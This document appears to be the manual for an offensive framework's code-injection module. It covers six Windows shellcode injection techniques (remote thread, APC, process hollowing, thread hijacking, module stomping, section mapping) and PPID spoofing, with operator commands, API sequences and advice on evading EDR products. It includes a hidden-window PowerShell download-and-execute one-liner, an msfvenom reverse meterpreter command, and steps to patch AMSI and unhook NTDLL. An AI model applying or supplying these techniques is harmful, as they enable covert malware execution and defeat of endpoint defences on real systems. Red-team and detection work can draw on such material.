# Code Injection

Six injection methods for executing shellcode in the context of another process. Method choice depends on detection risk, required privileges, and target state.

---

## Why Inject Into Another Process?

Running shellcode or a secondary payload inside another process:
- **Conceals the payload** — the agent process looks clean; a legitimate `explorer.exe` process appears to be doing the work
- **Inherits the target's trust** — a process with the right token gets elevated access
- **Avoids disk writes** — all methods below are fileless (shellcode stays in memory)
- **Blends network connections** — if the secondary payload needs network access, it does so from a trusted process

All injection commands accept a local shellcode binary file (`--file sc.bin`). The operator provides raw x64 shellcode; the agent handles allocation and execution.

---

## Method Comparison

| Method | Creates Thread | WriteProcessMemory | Noise Level | Requires Target Running | OPSEC |
|--------|---------------|-------------------|------------|------------------------|-------|
| CRT | Yes (new) | Yes | High | Yes | Low |
| APC | No (hijacks existing) | Yes | Medium | Yes (alertable thread) |Medium |
| Hollow | Yes (in suspended) | Yes | Medium | No (creates target) | Medium |
| Thread Hijack | No (redirects) | Yes | Medium | Yes | Medium |
| Module Stomp | No | Yes (DLL .text) | Low | No | High |
| Section Mapping | No | No | Very Low | No | High |

---

## 1. CRT — CreateRemoteThread

Classic injection: allocate memory in target, write shellcode, create a new remote thread.

```
❯ inject remote a1b2 --pid 1124 --file /home/op/sc.bin
[*] CRT injection into PID 1124...
[+] Injection completed.
```

**Internally:**
1. `OpenProcess(PROCESS_ALL_ACCESS, ..., pid)` — opens handle to target
2. `VirtualAllocEx` — allocate RWX memory in target
3. `WriteProcessMemory` — copy shellcode
4. `VirtualProtectEx` — change to RX (optional, for some EDRs)
5. `CreateRemoteThread` — create thread at shellcode address

**When to use:** Quick testing in lab. Reliable and straightforward.

**Why avoid in production:** `CreateRemoteThread` is one of the most-signatured API call sequences in EDR products. The combination of `OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread` almost always triggers a behavioral alert on a mature EDR.

---

## 2. APC — Asynchronous Procedure Call

Queue shellcode execution as an APC on an existing alertable thread.

```
❯ inject remote a1b2 --pid 1124 --file /home/op/sc.bin --method apc
```

**Internally:**
1. Opens target process
2. Allocates and writes shellcode (same as CRT)
3. Finds or opens threads in the target that are in an alertable wait state
4. Calls `QueueUserAPC` pointing at the shellcode
5. Thread executes APC when it next enters an alertable wait

**When to use:** Quieter than CRT — no new thread creation event. More reliable against thread-creation detections.

**Limitation:** APC execution only happens when the target thread calls `WaitForSingleObjectEx`, `SleepEx`, `MsgWaitForMultipleObjectsEx`, or similar alertable wait functions. A thread that never waits alertably will never execute the APC. Best targets: GUI applications that use message loops.

---

## 3. Process Hollowing

Creates a new suspended process, unmaps its legitimate code, maps in the shellcode, then resumes.

```
❯ hollow a1b2 --file /home/op/sc.bin
❯ hollow a1b2 --file /home/op/sc.bin --exe "C:\Windows\System32\notepad.exe"
```

**Internally:**
1. `CreateProcess(..., CREATE_SUSPENDED)` — spawn the host binary suspended
2. `NtUnmapViewOfSection` — unmap the host's original .text section
3. `VirtualAllocEx` + `WriteProcessMemory` — write shellcode at the original entry point
4. `SetThreadContext` — set RIP to shellcode entry
5. `ResumeThread` — resume the process

**When to use:**
- When you want the shellcode running inside a process that looks like `notepad.exe` or `svchost.exe` — the process name is a known legitimate binary, which passes name-based filters.
- When you don't have a target process already running.

**OPSEC notes:** The sequence unmapping + re-mapping of memory in a new suspended process is behavioral IoC that mature EDRs (CrowdStrike, SentinelOne) detect. The resulting process has no backing file on disk for the executable memory (hollow indicator).

---

## 4. Thread Hijacking

Suspends an existing thread in the target, patches its instruction pointer to the shellcode, then resumes.

```
❯ hijack a1b2 --pid 1124 --file /home/op/sc.bin
```

**Internally:**
1. Open target process and enumerate threads
2. Select a thread (`OpenThread(THREAD_ALL_ACCESS)`)
3. `SuspendThread`
4. `GetThreadContext` — save current register state
5. Modify `CONTEXT.Rip` to point to shellcode address (allocated via `VirtualAllocEx`)
6. `SetThreadContext`
7. `ResumeThread`

**When to use:**
- Avoids thread creation events (no `CreateRemoteThread`)
- Good for targets where you can afford to briefly disrupt one thread

**Risk:** If the hijacked thread is a critical system thread, redirecting execution can crash the target process. Target UI threads or secondary worker threads, not the main application thread of critical system services.

---

## 5. Module Stomping

Loads a low-reputation DLL into the target process, then overwrites its `.text` section with shellcode.

```
❯ stomp a1b2 --file /home/op/sc.bin --dll xpsservices.dll
```

**Internally:**
1. `LoadLibraryA(dll)` in the target — load a legitimate but rarely-used DLL
2. Locate the DLL's `.text` section in memory via PE header walk
3. `VirtualProtectEx` — change `.text` from RX to RW
4. `WriteProcessMemory` — overwrite `.text` with shellcode
5. `VirtualProtectEx` — restore to RX
6. Execute from the DLL's memory region (thread or APC)

**Why this is effective:** The shellcode now lives inside the memory range of a legitimate loaded DLL (`xpsservices.dll`). Memory scanners that check if each memory range has a backing file on disk see the DLL — not the shellcode.

**Good stomp targets:** Infrequently-used system DLLs that are not actively executing code: `xpsservices.dll`, `wmdmlog.dll`, `mspbde40.dll`. Avoid DLLs with active threads.

---

## 6. Section Mapping Injection

The stealthiest method. Creates a shared memory section between agent and target — no `WriteProcessMemory` call needed.

```
❯ mapinject a1b2 --file /home/op/sc.bin
❯ mapinject a1b2 --file /home/op/sc.bin --pid 1124
```

**Internally (cross-process variant):**
1. `NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)` — create shared section
2. `NtMapViewOfSection` in agent process — write shellcode to mapped view
3. `NtMapViewOfSection` in target process — map same section
4. Execute from target's mapped view (using APC or thread context)
5. `NtUnmapViewOfSection` — clean up agent-side mapping

**Why this evades detection:**
- No `WriteProcessMemory` call — this API is heavily monitored
- The section is shared memory; the data appears as memory-mapped rather than shellcode-injected
- Works without opening the target process with `PROCESS_VM_WRITE`

**When to use:** Highest evasion requirement; EDR-heavy environments.

---

## PPID Spoofing

Spawn a new process with a fake parent PID, making it appear as a child of a trusted process in the process tree.

```
# Spawn cmd.exe appearing as a child of explorer.exe
❯ inject ppid a1b2 cmd.exe --ppid-name explorer.exe

# Spawn with explicit parent PID and args
❯ inject ppid a1b2 powershell.exe --ppid 2048 --args "-WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://...')\""
```

**Why it matters:** Many EDR products and analysts trace the parent-child process relationship. A `cmd.exe` spawned by your agent looks suspicious. The same `cmd.exe` appearing as a child of `explorer.exe` (the Windows shell) looks like a normal interactive shell.

**Internally:** Uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` in `UpdateProcThreadAttribute` on the `STARTUPINFOEX` structure before calling `CreateProcess`.

---

## Preparing Shellcode

Any raw x64 shellcode file works. Common sources:
- msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=... -f raw -o sc.bin`
- Your own position-independent code
- BOF-based shellcode (use `bof exec` command instead for Beacon Object Files)

**Recommended pre-injection steps:**
1. `bypass amsi a1b2` — patch AMSI in agent process before injecting
2. `evasion unhook a1b2` — restore NTDLL if EDR hooks are suspected
3. Choose the target process (stable long-lived process, appropriate privileges)
4. Use the quietest injection method that meets your requirements
